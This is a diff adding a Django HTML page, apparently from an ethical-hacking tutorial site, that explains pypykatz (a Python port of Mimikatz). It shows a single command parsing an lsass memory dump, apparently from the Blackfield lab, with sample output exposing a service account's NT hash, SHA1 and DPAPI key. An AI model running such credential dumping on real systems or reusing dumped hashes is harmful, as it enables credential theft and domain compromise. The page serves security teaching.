@@ -1,0 +1,35 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is pypykatz?</h1>
+    <p class="common">Pypykatz is an open-source tool and Python library that is a pure Python implementation of certain functionalities found in the well-known credential-dumping tool Mimikatz.</p>
+
+    <h1>Decode lsass.DMP file</h1>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/blackfield/forensic]
+└─$ pypykatz lsa minidump lsass.DMP                             
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+...sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+...</code></pre></div>
+</body>
+</html>
